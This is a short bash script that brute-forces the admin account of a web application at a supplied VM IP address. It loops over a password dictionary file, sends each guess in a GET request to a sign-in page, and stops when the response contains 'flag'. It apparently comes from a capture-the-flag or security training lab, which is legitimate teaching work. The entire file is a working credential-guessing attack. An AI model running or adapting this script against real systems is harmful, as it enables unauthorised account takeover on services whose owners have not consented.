#!/bin/bash

if [ -z "$1" ]
then
    echo "must pass in the vm ip as argument";
    exit 1;
fi

for password in $(cat dictionnary); do
    echo "... trying with $password"
    page=$(curl -s "http://$1/index.php?page=signin&username=admin&password=${password}&Login=Login#")
    if echo $page | grep 'flag' > /dev/null; then
        echo "the password is $password"
        exit 0
    fi
done

echo "could not find the password, sorry !"
exit 1
